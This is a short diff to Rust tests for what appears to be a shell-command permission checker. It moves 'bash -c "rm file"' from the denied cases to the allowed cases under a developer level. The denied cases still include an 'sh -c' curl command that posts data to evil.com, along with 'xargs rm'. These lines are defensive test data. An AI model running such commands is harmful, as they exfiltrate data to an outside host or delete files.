@@ -137,6 +137,8 @@ mod tests {
         xargs_find_safe: "xargs find . -name '*.py'",
         xargs_sed_safe: "xargs sed 's/foo/bar/'",
         xargs_nested_bash_safe: "xargs bash -c 'git status'",
+        // engine-authoritative: `bash -c "rm file"` deletes a WORKTREE file → developer.
+        bash_c_worktree_rm: "bash -c \"rm file\"",
         break_bare: "break",
         break_numeric: "break 2",
         continue_bare: "continue",
@@ -144,7 +146,6 @@ mod tests {
     }
 
     denied! {
-        bash_c_unsafe: "bash -c \"rm file\"",
         sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
         bash_script_denied: "bash script.sh",
         xargs_rm_denied: "xargs rm",
